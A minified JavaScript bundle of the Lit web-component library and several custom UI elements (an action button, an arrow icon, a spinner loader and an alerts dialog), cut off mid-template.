const t=window,e=t.ShadowRoot&&(void 0===t.ShadyCSS||t.ShadyCSS.nativeShadow)&&"adoptedStyleSheets"in Document.prototype&&"replace"in CSSStyleSheet.prototype,s=Symbol(),n=new WeakMap;class o{constructor(e,t,i){if(this._$cssResult$=!0,i!==s)throw Error("CSSResult is not constructable. Use `unsafeCSS` or `css` instead.");this.cssText=e,this.t=t}get styleSheet(){let t=this.o;const i=this.t;if(e&&void 0===t){const e=void 0!==i&&1===i.length;e&&(t=n.get(i)),void 0===t&&((this.o=t=new CSSStyleSheet).replaceSync(this.cssText),e&&n.set(i,t))}return t}toString(){return this.cssText}}const r=e=>new o("string"==typeof e?e:e+"",void 0,s),i=(e,...t)=>{const i=1===e.length?e[0]:t.reduce(((t,i,n)=>t+(e=>{if(!0===e._$cssResult$)return e.cssText;if("number"==typeof e)return e;throw Error("Value passed to 'css' function must be a 'css' function result: "+e+". Use 'unsafeCSS' to pass non-literal values, but take care to ensure page security.")})(i)+e[n+1]),e[0]);return new o(i,e,s)},S=(i,n)=>{e?i.adoptedStyleSheets=n.map((e=>e instanceof CSSStyleSheet?e:e.styleSheet)):n.forEach((e=>{const n=document.createElement("style"),r=t.litNonce;void 0!==r&&n.setAttribute("nonce",r),n.textContent=e.cssText,i.appendChild(n)}))},c=e?e=>e:e=>e instanceof CSSStyleSheet?(e=>{let t="";for(const i of e.cssRules)t+=i.cssText;return r(t)})(e):e;var s1;const e1=window,r1=e1.trustedTypes,h=r1?r1.emptyScript:"",o1=e1.reactiveElementPolyfillSupport,n1={toAttribute(e,t){switch(t){case Boolean:e=e?h:null;break;case Object:case Array:e=null==e?e:JSON.stringify(e)}return e},fromAttribute(e,t){let i=e;switch(t){case Boolean:i=null!==e;break;case Number:i=null===e?null:Number(e);break;case Object:case Array:try{i=JSON.parse(e)}catch(e){i=null}}return i}},a=(e,t)=>t!==e&&(t==t||e==e),l={attribute:!0,type:String,converter:n1,reflect:!1,hasChanged:a};class d extends HTMLElement{constructor(){super(),this._$Ei=new Map,this.isUpdatePending=!1,this.hasUpdated=!1,this._$El=null,this.u()}static addInitializer(e){var t;this.finalize(),(null!==(t=this.h)&&void 0!==t?t:this.h=[]).push(e)}static get observedAttributes(){this.finalize();const e=[];return this.elementProperties.forEach(((t,i)=>{const n=this._$Ep(i,t);void 0!==n&&(this._$Ev.set(n,i),e.push(n))})),e}static createProperty(e,t=l){if(t.state&&(t.attribute=!1),this.finalize(),this.elementProperties.set(e,t),!t.noAccessor&&!this.prototype.hasOwnProperty(e)){const i="symbol"==typeof e?Symbol():"__"+e,n=this.getPropertyDescriptor(e,i,t);void 0!==n&&Object.defineProperty(this.prototype,e,n)}}static getPropertyDescriptor(e,t,i){return{get(){return this[t]},set(n){const r=this[e];this[t]=n,this.requestUpdate(e,r,i)},configurable:!0,enumerable:!0}}static getPropertyOptions(e){return this.elementProperties.get(e)||l}static finalize(){if(this.hasOwnProperty("finalized"))return!1;this.finalized=!0;const e=Object.getPrototypeOf(this);if(e.finalize(),void 0!==e.h&&(this.h=[...e.h]),this.elementProperties=new Map(e.elementProperties),this._$Ev=new Map,this.hasOwnProperty("properties")){const e=this.properties,t=[...Object.getOwnPropertyNames(e),...Object.getOwnPropertySymbols(e)];for(const i of t)this.createProperty(i,e[i])}return this.elementStyles=this.finalizeStyles(this.styles),!0}static finalizeStyles(e){const t=[];if(Array.isArray(e)){const i=new Set(e.flat(1/0).reverse());for(const e of i)t.unshift(c(e))}else void 0!==e&&t.push(c(e));return t}static _$Ep(e,t){const i=t.attribute;return!1===i?void 0:"string"==typeof i?i:"string"==typeof e?e.toLowerCase():void 0}u(){var e;this._$E_=new Promise((e=>this.enableUpdating=e)),this._$AL=new Map,this._$Eg(),this.requestUpdate(),null===(e=this.constructor.h)||void 0===e||e.forEach((e=>e(this)))}addController(e){var t,i;(null!==(t=this._$ES)&&void 0!==t?t:this._$ES=[]).push(e),void 0!==this.renderRoot&&this.isConnected&&(null===(i=e.hostConnected)||void 0===i||i.call(e))}removeController(e){var t;null===(t=this._$ES)||void 0===t||t.splice(this._$ES.indexOf(e)>>>0,1)}_$Eg(){this.constructor.elementProperties.forEach(((e,t)=>{this.hasOwnProperty(t)&&(this._$Ei.set(t,this[t]),delete this[t])}))}createRenderRoot(){var e;const t=null!==(e=this.shadowRoot)&&void 0!==e?e:this.attachShadow(this.constructor.shadowRootOptions);return S(t,this.constructor.elementStyles),t}connectedCallback(){var e;void 0===this.renderRoot&&(this.renderRoot=this.createRenderRoot()),this.enableUpdating(!0),null===(e=this._$ES)||void 0===e||e.forEach((e=>{var t;return null===(t=e.hostConnected)||void 0===t?void 0:t.call(e)}))}enableUpdating(e){}disconnectedCallback(){var e;null===(e=this._$ES)||void 0===e||e.forEach((e=>{var t;return null===(t=e.hostDisconnected)||void 0===t?void 0:t.call(e)}))}attributeChangedCallback(e,t,i){this._$AK(e,i)}_$EO(e,t,i=l){var n;const r=this.constructor._$Ep(e,i);if(void 0!==r&&!0===i.reflect){const s=(void 0!==(null===(n=i.converter)||void 0===n?void 0:n.toAttribute)?i.converter:n1).toAttribute(t,i.type);this._$El=e,null==s?this.removeAttribute(r):this.setAttribute(r,s),this._$El=null}}_$AK(e,t){var i;const n=this.constructor,r=n._$Ev.get(e);if(void 0!==r&&this._$El!==r){const e=n.getPropertyOptions(r),s="function"==typeof e.converter?{fromAttribute:e.converter}:void 0!==(null===(i=e.converter)||void 0===i?void 0:i.fromAttribute)?e.converter:n1;this._$El=r,this[r]=s.fromAttribute(t,e.type),this._$El=null}}requestUpdate(e,t,i){let n=!0;void 0!==e&&(((i=i||this.constructor.getPropertyOptions(e)).hasChanged||a)(this[e],t)?(this._$AL.has(e)||this._$AL.set(e,t),!0===i.reflect&&this._$El!==e&&(void 0===this._$EC&&(this._$EC=new Map),this._$EC.set(e,i))):n=!1),!this.isUpdatePending&&n&&(this._$E_=this._$Ej())}async _$Ej(){this.isUpdatePending=!0;try{await this._$E_}catch(e){Promise.reject(e)}const e=this.scheduleUpdate();return null!=e&&await e,!this.isUpdatePending}scheduleUpdate(){return this.performUpdate()}performUpdate(){var e;if(!this.isUpdatePending)return;this.hasUpdated,this._$Ei&&(this._$Ei.forEach(((e,t)=>this[t]=e)),this._$Ei=void 0);let t=!1;const i=this._$AL;try{t=this.shouldUpdate(i),t?(this.willUpdate(i),null===(e=this._$ES)||void 0===e||e.forEach((e=>{var t;return null===(t=e.hostUpdate)||void 0===t?void 0:t.call(e)})),this.update(i)):this._$Ek()}catch(e){throw t=!1,this._$Ek(),e}t&&this._$AE(i)}willUpdate(e){}_$AE(e){var t;null===(t=this._$ES)||void 0===t||t.forEach((e=>{var t;return null===(t=e.hostUpdated)||void 0===t?void 0:t.call(e)})),this.hasUpdated||(this.hasUpdated=!0,this.firstUpdated(e)),this.updated(e)}_$Ek(){this._$AL=new Map,this.isUpdatePending=!1}get updateComplete(){return this.getUpdateComplete()}getUpdateComplete(){return this._$E_}shouldUpdate(e){return!0}update(e){void 0!==this._$EC&&(this._$EC.forEach(((e,t)=>this._$EO(t,this[t],e))),this._$EC=void 0),this._$Ek()}updated(e){}firstUpdated(e){}}var t1;d.finalized=!0,d.elementProperties=new Map,d.elementStyles=[],d.shadowRootOptions={mode:"open"},null==o1||o1({ReactiveElement:d}),(null!==(s1=e1.reactiveElementVersions)&&void 0!==s1?s1:e1.reactiveElementVersions=[]).push("1.6.1");const i1=window,s2=i1.trustedTypes,e2=s2?s2.createPolicy("lit-html",{createHTML:e=>e}):void 0,o2="$lit$",n2=`lit$${(Math.random()+"").slice(9)}$`,l1="?"+n2,h1=`<${l1}>`,r2=document,d1=()=>r2.createComment(""),u=e=>null===e||"object"!=typeof e&&"function"!=typeof e,c1=Array.isArray,v=e=>c1(e)||"function"==typeof(null==e?void 0:e[Symbol.iterator]),a1="[ \t\n\f\r]",f=/<(?:(!--|\/[^a-zA-Z])|(\/?[a-zA-Z][^>\s]*)|(\/?$))/g,_=/-->/g,m=/>/g,p=RegExp(`>|${a1}(?:([^\\s"'>=/]+)(${a1}*=${a1}*(?:[^ \t\n\f\r"'\`<>=]|("|')|))|$)`,"g"),g=/'/g,$=/"/g,y=/^(?:script|style|textarea|title)$/i,w=e=>(t,...i)=>({_$litType$:e,strings:t,values:i}),x=w(1),b=w(2),T=Symbol.for("lit-noChange"),A=Symbol.for("lit-nothing"),E=new WeakMap,C=r2.createTreeWalker(r2,129,null,!1),P=(e,t)=>{const i=e.length-1,n=[];let r,s=2===t?"<svg>":"",o=f;for(let t=0;t<i;t++){const i=e[t];let a,l,d=-1,c=0;for(;c<i.length&&(o.lastIndex=c,l=o.exec(i),null!==l);)c=o.lastIndex,o===f?"!--"===l[1]?o=_:void 0!==l[1]?o=m:void 0!==l[2]?(y.test(l[2])&&(r=RegExp("</"+l[2],"g")),o=p):void 0!==l[3]&&(o=p):o===p?">"===l[0]?(o=null!=r?r:f,d=-1):void 0===l[1]?d=-2:(d=o.lastIndex-l[2].length,a=l[1],o=void 0===l[3]?p:'"'===l[3]?$:g):o===$||o===g?o=p:o===_||o===m?o=f:(o=p,r=void 0);const h=o===p&&e[t+1].startsWith("/>")?" ":"";s+=o===f?i+h1:d>=0?(n.push(a),i.slice(0,d)+o2+i.slice(d)+n2+h):i+n2+(-2===d?(n.push(void 0),t):h)}const a=s+(e[i]||"<?>")+(2===t?"</svg>":"");if(!Array.isArray(e)||!e.hasOwnProperty("raw"))throw Error("invalid template strings array");return[void 0!==e2?e2.createHTML(a):a,n]};class V{constructor({strings:e,_$litType$:t},i){let n;this.parts=[];let r=0,s=0;const o=e.length-1,a=this.parts,[l,d]=P(e,t);if(this.el=V.createElement(l,i),C.currentNode=this.el.content,2===t){const e=this.el.content,t=e.firstChild;t.remove(),e.append(...t.childNodes)}for(;null!==(n=C.nextNode())&&a.length<o;){if(1===n.nodeType){if(n.hasAttributes()){const e=[];for(const t of n.getAttributeNames())if(t.endsWith(o2)||t.startsWith(n2)){const i=d[s++];if(e.push(t),void 0!==i){const e=n.getAttribute(i.toLowerCase()+o2).split(n2),t=/([.?@])?(.*)/.exec(i);a.push({type:1,index:r,name:t[2],strings:e,ctor:"."===t[1]?k:"?"===t[1]?I:"@"===t[1]?L:R})}else a.push({type:6,index:r})}for(const t of e)n.removeAttribute(t)}if(y.test(n.tagName)){const e=n.textContent.split(n2),t=e.length-1;if(t>0){n.textContent=s2?s2.emptyScript:"";for(let i=0;i<t;i++)n.append(e[i],d1()),C.nextNode(),a.push({type:2,index:++r});n.append(e[t],d1())}}}else if(8===n.nodeType)if(n.data===l1)a.push({type:2,index:r});else{let e=-1;for(;-1!==(e=n.data.indexOf(n2,e+1));)a.push({type:7,index:r}),e+=n2.length-1}r++}}static createElement(e,t){const i=r2.createElement("template");return i.innerHTML=e,i}}function N(e,t,i=e,n){var r,s,o,a;if(t===T)return t;let l=void 0!==n?null===(r=i._$Co)||void 0===r?void 0:r[n]:i._$Cl;const d=u(t)?void 0:t._$litDirective$;return(null==l?void 0:l.constructor)!==d&&(null===(s=null==l?void 0:l._$AO)||void 0===s||s.call(l,!1),void 0===d?l=void 0:(l=new d(e),l._$AT(e,i,n)),void 0!==n?(null!==(o=(a=i)._$Co)&&void 0!==o?o:a._$Co=[])[n]=l:i._$Cl=l),void 0!==l&&(t=N(e,l._$AS(e,t.values),l,n)),t}class S1{constructor(e,t){this._$AV=[],this._$AN=void 0,this._$AD=e,this._$AM=t}get parentNode(){return this._$AM.parentNode}get _$AU(){return this._$AM._$AU}u(e){var t;const{el:{content:i},parts:n}=this._$AD,r=(null!==(t=null==e?void 0:e.creationScope)&&void 0!==t?t:r2).importNode(i,!0);C.currentNode=r;let s=C.nextNode(),o=0,a=0,l=n[0];for(;void 0!==l;){if(o===l.index){let t;2===l.type?t=new M(s,s.nextSibling,this,e):1===l.type?t=new l.ctor(s,l.name,l.strings,this,e):6===l.type&&(t=new z(s,this,e)),this._$AV.push(t),l=n[++a]}o!==(null==l?void 0:l.index)&&(s=C.nextNode(),o++)}return r}v(e){let t=0;for(const i of this._$AV)void 0!==i&&(void 0!==i.strings?(i._$AI(e,i,t),t+=i.strings.length-2):i._$AI(e[t])),t++}}class M{constructor(e,t,i,n){var r;this.type=2,this._$AH=A,this._$AN=void 0,this._$AA=e,this._$AB=t,this._$AM=i,this.options=n,this._$Cp=null===(r=null==n?void 0:n.isConnected)||void 0===r||r}get _$AU(){var e,t;return null!==(t=null===(e=this._$AM)||void 0===e?void 0:e._$AU)&&void 0!==t?t:this._$Cp}get parentNode(){let e=this._$AA.parentNode;const t=this._$AM;return void 0!==t&&11===(null==e?void 0:e.nodeType)&&(e=t.parentNode),e}get startNode(){return this._$AA}get endNode(){return this._$AB}_$AI(e,t=this){e=N(this,e,t),u(e)?e===A||null==e||""===e?(this._$AH!==A&&this._$AR(),this._$AH=A):e!==this._$AH&&e!==T&&this._(e):void 0!==e._$litType$?this.g(e):void 0!==e.nodeType?this.$(e):v(e)?this.T(e):this._(e)}k(e){return this._$AA.parentNode.insertBefore(e,this._$AB)}$(e){this._$AH!==e&&(this._$AR(),this._$AH=this.k(e))}_(e){this._$AH!==A&&u(this._$AH)?this._$AA.nextSibling.data=e:this.$(r2.createTextNode(e)),this._$AH=e}g(e){var t;const{values:i,_$litType$:n}=e,r="number"==typeof n?this._$AC(e):(void 0===n.el&&(n.el=V.createElement(n.h,this.options)),n);if((null===(t=this._$AH)||void 0===t?void 0:t._$AD)===r)this._$AH.v(i);else{const e=new S1(r,this),t=e.u(this.options);e.v(i),this.$(t),this._$AH=e}}_$AC(e){let t=E.get(e.strings);return void 0===t&&E.set(e.strings,t=new V(e)),t}T(e){c1(this._$AH)||(this._$AH=[],this._$AR());const t=this._$AH;let i,n=0;for(const r of e)n===t.length?t.push(i=new M(this.k(d1()),this.k(d1()),this,this.options)):i=t[n],i._$AI(r),n++;n<t.length&&(this._$AR(i&&i._$AB.nextSibling,n),t.length=n)}_$AR(e=this._$AA.nextSibling,t){var i;for(null===(i=this._$AP)||void 0===i||i.call(this,!1,!0,t);e&&e!==this._$AB;){const t=e.nextSibling;e.remove(),e=t}}setConnected(e){var t;void 0===this._$AM&&(this._$Cp=e,null===(t=this._$AP)||void 0===t||t.call(this,e))}}class R{constructor(e,t,i,n,r){this.type=1,this._$AH=A,this._$AN=void 0,this.element=e,this.name=t,this._$AM=n,this.options=r,i.length>2||""!==i[0]||""!==i[1]?(this._$AH=Array(i.length-1).fill(new String),this.strings=i):this._$AH=A}get tagName(){return this.element.tagName}get _$AU(){return this._$AM._$AU}_$AI(e,t=this,i,n){const r=this.strings;let s=!1;if(void 0===r)e=N(this,e,t,0),s=!u(e)||e!==this._$AH&&e!==T,s&&(this._$AH=e);else{const n=e;let o,a;for(e=r[0],o=0;o<r.length-1;o++)a=N(this,n[i+o],t,o),a===T&&(a=this._$AH[o]),s||(s=!u(a)||a!==this._$AH[o]),a===A?e=A:e!==A&&(e+=(null!=a?a:"")+r[o+1]),this._$AH[o]=a}s&&!n&&this.j(e)}j(e){e===A?this.element.removeAttribute(this.name):this.element.setAttribute(this.name,null!=e?e:"")}}class k extends R{constructor(){super(...arguments),this.type=3}j(e){this.element[this.name]=e===A?void 0:e}}const H=s2?s2.emptyScript:"";class I extends R{constructor(){super(...arguments),this.type=4}j(e){e&&e!==A?this.element.setAttribute(this.name,H):this.element.removeAttribute(this.name)}}class L extends R{constructor(e,t,i,n,r){super(e,t,i,n,r),this.type=5}_$AI(e,t=this){var i;if((e=null!==(i=N(this,e,t,0))&&void 0!==i?i:A)===T)return;const n=this._$AH,r=e===A&&n!==A||e.capture!==n.capture||e.once!==n.once||e.passive!==n.passive,s=e!==A&&(n===A||r);r&&this.element.removeEventListener(this.name,this,n),s&&this.element.addEventListener(this.name,this,e),this._$AH=e}handleEvent(e){var t,i;"function"==typeof this._$AH?this._$AH.call(null!==(i=null===(t=this.options)||void 0===t?void 0:t.host)&&void 0!==i?i:this.element,e):this._$AH.handleEvent(e)}}class z{constructor(e,t,i){this.element=e,this.type=6,this._$AN=void 0,this._$AM=t,this.options=i}get _$AU(){return this._$AM._$AU}_$AI(e){N(this,e)}}const j=i1.litHtmlPolyfillSupport;null==j||j(V,M),(null!==(t1=i1.litHtmlVersions)&&void 0!==t1?t1:i1.litHtmlVersions=[]).push("2.7.3");const B=(e,t,i)=>{var n,r;const s=null!==(n=null==i?void 0:i.renderBefore)&&void 0!==n?n:t;let o=s._$litPart$;if(void 0===o){const e=null!==(r=null==i?void 0:i.renderBefore)&&void 0!==r?r:null;s._$litPart$=o=new M(t.insertBefore(d1(),e),e,void 0,null!=i?i:{})}return o._$AI(e),o};var l2,o3;class s3 extends d{constructor(){super(...arguments),this.renderOptions={host:this},this._$Do=void 0}createRenderRoot(){var e,t;const i=super.createRenderRoot();return null!==(e=(t=this.renderOptions).renderBefore)&&void 0!==e||(t.renderBefore=i.firstChild),i}update(e){const t=this.render();this.hasUpdated||(this.renderOptions.isConnected=this.isConnected),super.update(e),this._$Do=B(t,this.renderRoot,this.renderOptions)}connectedCallback(){var e;super.connectedCallback(),null===(e=this._$Do)||void 0===e||e.setConnected(!0)}disconnectedCallback(){var e;super.disconnectedCallback(),null===(e=this._$Do)||void 0===e||e.setConnected(!1)}render(){return T}}s3.finalized=!0,s3._$litElement$=!0,null===(l2=globalThis.litElementHydrateSupport)||void 0===l2||l2.call(globalThis,{LitElement:s3});const n3=globalThis.litElementPolyfillSupport;null==n3||n3({LitElement:s3}),(null!==(o3=globalThis.litElementVersions)&&void 0!==o3?o3:globalThis.litElementVersions=[]).push("3.3.2");const pattern=new class{styles(e){return i`
      
      .grid-node.flex {
        flex: 1;
      }

      
      .grid-node.flex-row {
        display: flex;
        flex-direction: column;
      }
      .grid-node.flex-column {
        display: flex;
        flex-direction: column;
      }

      
      .grid-node.align-center,
      .grid-node.align-center-center {
        align-items: center;
      }
      .grid-node.align-center-center {
        justify-content: center;
      }

      
      .grid-node.wireframe-action-row {
        display: flex;
        flex-direction: row;
        flex: none;
        justify-content: space-between;

        margin: 0rem calc(0rem - var(--node-gutter));
      }
      .grid-node.wireframe-action-row > .wireframe-action-row-inner {
        display: flex;
        flex-direction: row;
        flex: none;
        align-items: center;
      }
    `}render(e){return x`
      <!---->
      <!---->
    `}},pattern1=new class{styles(e){return i`
   
    `}render(e){return x`
      <!---->
      <!---->
    `}},pattern2=new class{styles(e){return i`
      


      :host {
        
        --tone-primer: #fafafa;
        --tone-accent: #d75e63;

        --tone-srim-drk: rgba(0, 0, 0, 0.6);
        --tone-srim-dim: rgba(0, 0, 0, 0.3);

        --tone-type-drk: #ffffff;
        --tone-type-dim: #e5e5e5;
        --tone-type-lit: #bbbbbb;

        --tone-drop-lit: #2d2d2d;
        --tone-drop-dim: #272727;
        --tone-drop-drk: #202020;

        --tone-task-lit: rgba(255, 255, 255, 0.10);
        --tone-task-dim: rgba(255, 255, 255, 0.06); 
        --tone-task-drk: rgba(255, 255, 255, 0.04); 

        
        --tone-line: #313131;

        --line-rad: 0.25rem;
        --line-wid: 0.0625rem;
        --line: var(--line-wid) solid var(--tone-line);

        
        --ring-wid: 0.125rem;
        --ring: var(--ring-wid) solid var(--tone-primer);

        
        --node-rad: 0.625rem;

        
        --node-hei: 3.125rem;
        --node-wid: 3.125rem;
        --node-hei-sm: 1.875rem;
        --node-wid-sm: 1.875rem;

        
        --node-margin: 1.25rem;
        --node-margin-sm: 0.75rem;

        
        --node-gutter: 0.625rem;
        --node-gutter-sm: 0.3125rem;
      }
    `}render(e){return x`
      <!---->
      <!---->
    `}},pattern3=new class{styles(e){return i`
      
      ul {
        display: flex;
        flex-direction: column;
        gap: 0.625rem;

        margin: 0rem 0rem 0rem 1.25rem;
        padding: 0rem 0rem;
      }

      li {
        margin: 0rem 0rem;
      }

      
      .type-node {
        font-size: var(--font-size);

        --font-size: 16px;
        --font-family: 'BreezeSans', 'Breeze Sans', -apple-system, Helvetica;
        --font-family-code: 'FiraCode', 'Fira Code', 'SF Mono Medium', 'Consolas', monospace;

        margin: 0rem 0rem 0rem 0rem !important;
      }

      
      .type-node.wrap {
        display: flex;
        flex-direction: column;
        gap: 0.625rem;
      }

      
      .type-node {
        font-family: var(--font-family);
        font-size: var(--font-size);
        text-rendering: optimizeLegibility;
        -webkit-font-smoothing: antialiased;
        -moz-osx-font-smoothing: grayscale;
      }

      
      a.type-node,
      .type-node a {
        
        color: var(--tone-accent);
        text-decoration: underline;
        
      }
      a.type-node:not(:hover):not(:focus),
      .type-node a:not(:hover):not(:focus) {
        text-decoration: none;
        
      }

      
      .type-node b {
        font-weight: 500;
      }

      
      .type-node.body,
      .type-node.body-sm {
        font-size: 0.94505625rem;
        font-weight: 400;
        line-height: 1.4539375rem;
        
        color: var(--tone-type-drk);
      }
      .type-node.body-sm {
        font-size: 0.969rem;
        
      }

      
      .type-node.code {
        font-family: var(--font-family-code);
        font-size: 0.8125rem;
        font-weight: 400;
        
        line-height: 1.25rem;
        color: var(--tone-type-drk);
      }

      
      .type-node.title {
        font-size: 1.625rem;
        font-weight: 700;
        
        color: var(--tone-type-drk);
      }
      .type-node.title-lg {
        font-size: 2rem;
        font-weight: 300;
        
        color: var(--tone-type-drk);
      }

      
      .type-node.heading {
        font-size: 1.2rem;
        font-weight: 400;
        color: var(--tone-type-drk);
      }
      .type-node.heading-sm {
        font-size: 0.85rem;
        font-weight: 500;
        line-height: 1.25rem;
        
        color: var(--tone-type-drk);
      }

      
      .type-node.description,
      .type-node.description-sm,
      .type-node.description-xs {
        font-size: 1rem;
        font-weight: 400;
        line-height: 1.25rem;
        
        color: var(--tone-type-dim);
      }

      .type-node.description-sm {
        font-size: 0.8125rem;
        font-weight: 400;
      }

      .type-node.description-xs {
        font-size: 0.75rem;
        font-weight: 400;
      }

      
      .type-node.action,
      .type-node.action-sm {
        font-size: 0.88889rem;
        
        line-height: 1.25rem;
        font-weight: 400;
        
      }

      .type-node.action-sm {
        font-size: 0.75rem;
        
      }

      
      .type-node.navigation {
        font-size: 1.0625rem;
        font-weight: 400;
        
        text-overflow: ellipsis;
        color: var(--tone-type-drk);
      }

      .type-node.navigation.sm {
        font-size: 0.85rem;
        
      }

      [data-disabled] .type-node.navigation {
        color: var(--tone-type-drk);
      }

      
      .type-node.tag-sm {
        font-size: 0.8rem;
        
        line-height: 2rem;
        font-weight: 400;
        color: var(--tone-type-drk);
      }
    `}render(e){return x`
      <!---->
      <!---->
    `}};var n4;function pattern4(e){const t={"applic:grid":pattern,"applic:node":pattern1,"applic:tone":pattern2,"applic:type":pattern3}[e];return{render:null!=t&&null!=t.render?t.render:e=>x`
              <!---->
              <!-- err: pattern not found -->
              <!---->
            `,styles:null!=t&&null!=t.styles?t.styles:e=>i`
              
            `}}null===(n4=window.HTMLSlotElement)||void 0===n4||n4.prototype.assignedElements;class ApplicAction extends s3{static styles=[i`
      
      :host {
        display: flex;
        flex-direction: row;
        flex: none;

        justify-content: center;
        align-items: center;

        height: var(--node-hei-sm);
        min-width: var(--node-wid-sm);
        padding: 0rem var(--node-gutter);
        margin: 0rem;

        border: none;
        border-radius: var(--line-rad);

        overflow: hidden;
        cursor: pointer;
      }

      :host(:focus-visible) {
        outline: var(--ring);
      }

      :host(:focus:not(:focus-visible)) {
        outline: none;
      }

      :host([hidden]) {
        display: none;
        pointer-events: none;
        user-select: none;
      }

      :host {
        background-color: var(--tone-task-dim);
        color: var(--tone-type-dim);

        transition: background-color 50ms ease-in, color 50ms ease-in;
      }
      :host([appearance='passive']) {
        background-color: transparent;
      }

      :host(:hover) {
        background-color: var(--tone-task-lit);
        color: var(--tone-type-dim);
      }
      :host([appearance='passive']:hover) {
        background-color: var(--tone-task-dim);
      }

      :host(:active) {
        background-color: var(--tone-task-drk);
        color: var(--tone-type-lit);
      }
    `];static get properties(){return{option:{type:Object,attribute:"option",hasChanged:(e,t)=>(console.log("option",e),!0)}}}option={};render(){return[x`
        <!---->
        <span class="type-node action">${this.option.caption}</span>
        <!---->
      `]}whenOption(){this.requestUpdate()}whenAction(){"action"in this.option&&this.option.action()}firstUpdated(){this.setAttribute("role","button"),this.setAttribute("tabindex","0"),this.addEventListener("click",(()=>{try{this.whenAction()}catch(e){}})),this.addEventListener("keydown",(e=>{const t=e.key.toLowerCase();"enter"!=t&&"space"!=t||this.whenAction()}))}}customElements.get("applic-action")||customElements.define("applic-action",ApplicAction);class ApplicFigure extends s3{static styles=[i`
      
      :host {
        display: flex;
        flex-direction: column;
        flex: none;
        justify-content: center;
        align-items: center;

        height: 2rem;
        width: 2rem;

        color: currentColor;
        overflow: visible;
      }

      svg {
        box-sizing: border-box;

        height: 1rem;
        width: 1rem;

        border-radius: 50%;
        overflow: hidden;
      }

      svg * {
        
      }
    `];render(){return[x`
        <!---->
        <!-- <svg viewBox="0 0 32 32">
          <circle stroke="currentColor" cx="16" cy="16" r="15" fill="none"></circle>
        </svg> -->
        <!---->

        <!---->
        <svg viewBox="0 0 24 24" >
          <path fill="none"  stroke-width="1.7" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" d="M10.5 19.5L3 12m0 0l7.5-7.5M3 12h18" />
        </svg>
        <!---->
      `]}}customElements.get("applic-figure")||customElements.define("applic-figure",ApplicFigure);class ApplicLoader extends s3{static styles=[i`
      
      :host {
        display: flex;
        flex-direction: column;
        flex: none;
        justify-content: center;
        align-items: center;

        height: 2rem;
        width: 2rem;

        overflow: hidden;
        opacity: 0;
        transition: opacity 100ms 0ms cubic-bezier(0, 0, 0.2, 1);
      }

      :host([node-role='active']) {
        opacity: 1;
        transition: opacity 100ms 200ms cubic-bezier(0, 0, 0.2, 1);
      }

      
      .node.spinner {
        box-siting: border-box;
        position: absolute;
        height: 1rem;
        width: 1rem;
        border-radius: 50%;
        margin: 0 auto;
        pointer-events: none;
      }

      .node.spinner > .spinner-circle {
        box-siting: border-box;
        stroke-width: 0.1875rem;
        transform-origin: 50%;
      }

      .node.spinner > .spinner-circle:not(.role-twin) {
        stroke: var(--tone-primer);
        -webkit-animation: progress-spinner-animation-line 6200ms linear infinite, progress-spinner-animation-rotate 6200ms linear infinite;
        animation: progress-spinner-animation-line 6200ms linear infinite, progress-spinner-animation-rotate 6200ms linear infinite;
        animation-delay: -1000ms;
      }

      .node.spinner > .spinner-circle.role-twin {
        stroke: var(--tone-primer);
        -webkit-animation: progress-spinner-animation-line 6200ms linear infinite, progress-spinner-animation-rotate-twin 6200ms linear infinite;
        animation: progress-spinner-animation-line 6200ms linear infinite, progress-spinner-animation-rotate-twin 6200ms linear infinite;
        animation-delay: -1000ms;
      }

      
      @-webkit-keyframes progress-spinner-animation-rotate {
        0% {
          transform: rotate(180deg);
        }
        90% {
          transform: rotate(2700deg);
        }
        100% {
          transform: rotate(2700deg);
        }
      }

      @-webkit-keyframes progress-spinner-animation-rotate-twin {
        0% {
          transform: rotate(0deg);
        }
        90% {
          transform: rotate(2520deg);
        }
        100% {
          transform: rotate(2520deg);
        }
      }

      @-webkit-keyframes progress-spinner-animation-line {
        0% {
          stroke-dasharray: 47, 1000;
          stroke-dashoffset: 0;
        }
        5% {
          stroke-dasharray: 47, 1000;
          stroke-dashoffset: 0;
        }
        10% {
          stroke-dasharray: 14, 1000;
          stroke-dashoffset: -13;
        }
        80% {
          stroke-dasharray: 14, 1000;
          stroke-dashoffset: -13;
        }
        85% {
          stroke-dasharray: 47, 1000;
          stroke-dashoffset: 0;
        }
        100% {
          stroke-dasharray: 47, 1000;
          stroke-dashoffset: 0;
        }
      }
    `];render(){return[x`
        <!---->
        <svg class="node spinner" viewbox="0 0 32 32">
          <circle class="spinner-circle" cx="16" cy="16" r="15" fill="none"></circle>
          <circle class="spinner-circle role-twin" cx="16" cy="16" r="15" fill="none"></circle>
        </svg>
        <!---->
      `]}}customElements.get("applic-loader")||customElements.define("applic-loader",ApplicLoader);class ApplicViewportAlerts extends s3{static styles=[pattern4("applic:grid").styles({}),pattern4("applic:tone").styles({}),pattern4("applic:type").styles({}),i`
      :host,
      :host * {
        box-sizing: border-box;
      }

      .node.alerts:not([open]) {
        display: none;
      }

      .node.alerts[open] {
        
        inset: auto 0rem calc(var(--node-gutter) * 2) 0rem;

        display: flex;
        flex: none;
        flex-direction: column;

        width: 400px;
        padding: 0rem;

        max-width: calc(100% - var(--node-gutter) * 2);
        max-height: calc(100% - var(--node-gutter) * 2);

        pointer-events: all;

        border: none;
        border-radius: var(--node-rad);
        outline: var(--line);

        background: var(--tone-drop-dim);

        animation: show 200ms ease normal;
        -webkit-animation: show 200ms ease normal;
        -webkit-tap-highlight-color: transparent;
      }

      show {
        from {
          transform: translateY(calc(100% + 0.625rem));
        }
        to {
          transform: translateY(0%);
        }
      }
      @-webkit-keyframes show {
        from {
          opacity: 0;
          transform: translateY(calc(50%));
        }
        to {
          opacity: 1;
          transform: translateY(0%);
        }
      }

      .node.alerts::backdrop {
        background: transparent;
      }

      [open] + .node.alerts-srim {
        z-index: 10;
        position: fixed;
        inset: 0rem 0rem 0rem 0rem;
        background: var(--tone-srim-dim);
      }

      .node.alerts > .alerts-views {
        overflow: hidden auto;
        overflow: hidden overlay;
        padding: 1.25rem 1.25rem;
      }

      .node.alerts > .alerts-beneath {
        display: flex;
        flex: none;
        flex-direction: row;
        align-items: center;

        height: var(--node-hei);

        gap: 0.625rem;
        padding: 0rem var(--node-margin);

        
        
      }
    `];render(){return x`
      <dialog class="node alerts" @close=${this.whenSkip.bind(this)}>
        <div class="node alerts-views">
          ${this.view.map((({message:e},t)=>x`
                <div class="alerts-views-inner" ?hidden="${t!=this.active.index}">
                  <!---->
                  <div>${this.head.caption}</div>
                  <div>${e}</div>
                  <!---->
                </div>
              `))}
        </div>

